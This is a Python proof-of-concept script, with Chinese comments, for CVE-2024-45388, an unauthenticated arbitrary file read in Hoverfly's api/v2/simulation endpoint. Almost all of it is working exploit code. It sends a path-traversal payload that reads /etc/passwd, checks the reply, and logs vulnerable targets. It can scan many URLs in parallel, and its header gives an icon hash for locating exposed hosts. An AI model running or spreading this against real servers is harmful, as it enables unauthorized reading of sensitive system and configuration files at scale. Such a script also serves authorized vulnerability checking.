# Hoverfly api/v2/simulation 任意文件读取漏洞(CVE-2024-45388)
# icon_hash="1357234275"
# 产品简介：Hoverfly是一个为开发人员和测试人员提供的轻量级服务虚拟化/API模拟/API模拟工具。
# 漏洞概述：Hoverfly api/v2/simulation 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。
# POST/任意文件读取

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test = """ 
            \x1b[38m██╗  ██╗ ██████╗ ██╗   ██╗███████╗██████╗ ███████╗██╗  ██╗   ██╗
            \x1b[36m██║  ██║██╔═══██╗██║   ██║██╔════╝██╔══██╗██╔════╝██║  ╚██╗ ██╔╝
            \x1b[34m███████║██║   ██║██║   ██║█████╗  ██████╔╝█████╗  ██║   ╚████╔╝ 
            \x1b[35m██╔══██║██║   ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗██╔══╝  ██║    ╚██╔╝  
            \x1b[31m██║  ██║╚██████╔╝ ╚████╔╝ ███████╗██║  ██║██║     ███████╗██║   
            \x1b[33m╚═╝  ╚═╝ ╚═════╝   ╚═══╝  ╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝
>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
    --author:Kucei  --Version:Hoverfly_api/v2/simulation_任意文件读取漏洞(CVE-2024-45388) 
<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<                                                  
\x1b[0m"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser('Hoverfly_api/v2/simulation_任意文件读取漏洞(CVE-2024-45388)')
    parser.add_argument('-u','--url',dest='url',type=str,help='Please Input URL')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please Input File')
    args = parser.parse_args()

    # 判断url/file
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list =[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
        pool = Pool(80)
        pool.map(poc,url_list)
        pool.close()
        pool.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/api/v2/simulation'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    # proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080',}
    data = {"data":{"pairs":[{"request":{},"response":{"bodyFile": "../../../../../../../etc/passwd","x":"aaa"}} ]},"meta":{"schemaVersion":"v5.3"}}
    try :
        response = requests.put(url=target+url_payload,headers=headers,json=data,verify=False,timeout=5)
        # print(response.status_code)
        # print(response.text)
        if response.status_code == 200 and 'root:' in response.text:
            print( f"[+] {target} 存在漏洞！\n")
            with open('CVE-2024-45388.txt','a',encoding='utf-8')as f:
                f.write(target+url_payload+'\n')
                return True
        else:
            print("[-] 不存在漏洞！！")
            return False
    except Exception:
        print(target+"站点连接异常")


if __name__ == '__main__':
    main()